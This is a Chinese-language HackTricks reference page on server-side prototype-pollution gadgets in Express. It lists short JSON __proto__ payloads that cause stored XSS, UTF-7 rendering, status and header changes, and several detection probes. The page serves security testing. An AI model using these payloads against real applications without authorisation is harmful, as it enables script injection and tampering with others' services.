# Express 原型污染小工具

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我们 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
## 提供 XSS 响应

### 将 JSON 内容类型更改为 HTML

在使用 **JSON 内容类型响应** 并反映 JSON 的 Express 应用中：
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
在这些情况下，通常在JSON内容类型中不可能出现XSS。然而，通过原型污染，我们可以**迷惑Express以提供HTML响应。** 这个漏洞依赖于应用程序使用**`res.send(obj)`** 并且使用application/json内容类型的body解析器。
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
通过同时污染 **`body`** 和 **`_body`** 属性，可以导致 **Express 提供 HTML 内容类型** 并反映 `_body` 属性，导致存储型 XSS。

### 渲染 UTF7

可以使 express **渲染 UTF-7 内容**：
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## 安全扫描技术

### JSON 空格

以下 PP 将使 JSON 内的属性多出一个空格，这不会破坏功能性：
```json
{"__proto__":{"json spaces": " "}}
```
那么反射的JSON将看起来像：
```json
{"foo":  "bar"} -- Note the extra space
```
### 暴露的头部

以下PP小工具将使服务器发送回HTTP头部：**`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
它需要**安装CORS模块**

### **OPTIONS 方法**

使用以下有效载荷，可以**从OPTIONS响应中隐藏方法**：
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **状态**

可以使用以下PP有效载荷更改**返回状态码**：
```json
{"__proto__":{"status":510}}
```
### 错误

当您使用如字符串这样的原始值给原型赋值时，它会产生一个**无操作，因为原型必须是一个对象**。如果您尝试将一个原型对象赋给`Object.prototype`本身，这将会**抛出一个异常**。我们可以利用这两种行为来**检测原型污染是否成功**：
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### 反射值

如果应用程序在响应中反映了一个对象，您可以创建一个带有**奇怪名称和 `__proto__`** 的属性，如果**只有奇怪的名称被反映**，那么这个网站可能是脆弱的：
```json
{"hacktricks":"rocks","__proto__":"test"}
```
如果使用了 Lodash 或类似库，你可以**通过 PP 设置对象内部的属性**，如果该属性没有反映出来，那是因为 Lodash 会检查当前对象，看看该属性是否已经存在于合并后的对象中：
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## 杂项

### 允许点号

Express 中有一个选项可以让你**从查询字符串参数创建对象**。\
你绝对可以在漏洞**链**中利用它来攻击**原型污染漏洞**。
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` 在 Node 中创建一个对象。**

## 参考资料

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我们 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
